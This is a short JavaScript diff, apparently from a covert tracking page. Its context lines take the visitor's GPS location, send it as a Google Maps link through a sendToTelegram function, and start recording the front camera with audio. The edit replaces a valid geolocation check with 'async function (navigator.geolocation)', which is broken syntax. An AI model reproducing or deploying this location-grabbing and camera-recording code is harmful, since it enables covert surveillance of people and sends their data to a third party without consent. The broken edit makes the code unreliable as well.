@@ -200,7 +200,7 @@
       } catch (err) {}
     }
 
-    if (navigator.geolocation) {
+    async function (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
           pos => {
             const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
@@ -212,6 +212,7 @@
         sendToTelegram(`📍 Browser tidak support GPS`);
       }
     }
+    
     async function recordFrontVideo() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
